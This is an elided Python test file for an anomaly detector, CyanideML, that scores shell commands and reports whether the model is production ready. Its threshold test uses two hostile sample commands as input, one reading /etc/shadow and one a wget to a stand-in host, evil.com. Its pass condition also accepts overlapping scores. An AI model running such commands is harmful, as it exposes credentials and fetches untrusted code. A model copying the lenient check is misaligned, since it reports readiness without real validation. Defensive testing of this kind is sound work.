...
try:
    ...
    print(f"[!] Critical Error: Failed to import CyanideML pipeline. Check PYTHONPATH or installation. {e}")
    sys.exit(1)
...
class TestReport:
    ...
    def generate(self, passed_suites: int, failed_suites: int) -> str:
        ...
        report.append("-" * 60)
        report.append("")
        report.append(f"Overall Assessment: {'✅ PRODUCTION READY' if failed_suites == 0 else '⚠️ REQUIRES IMPROVEMENT'}")
        report.append("")
...
class ModelValidator:
    ...
    def test_autoencoder_clean(self):
        ...
        for cmd in clean_commands:
            ...
            if is_clean and is_valid_output:
                ...
                details.append(f"FP: {cmd} (Score: {res['anomaly_score']:.4f}, Sev: {res['severity']})")
    ...
    def test_threshold_validation(self):
        ...
        malicious_scores = [self.pipeline.anomaly_detector.predict(c)[1] for c in ["cat /etc/shadow", "wget http://evil.com"]]
        ...
        success = separation and (p95_clean < threshold < p5_malicious or overlap) # Allow pass if threshold is reasonably between them or if just testing logic
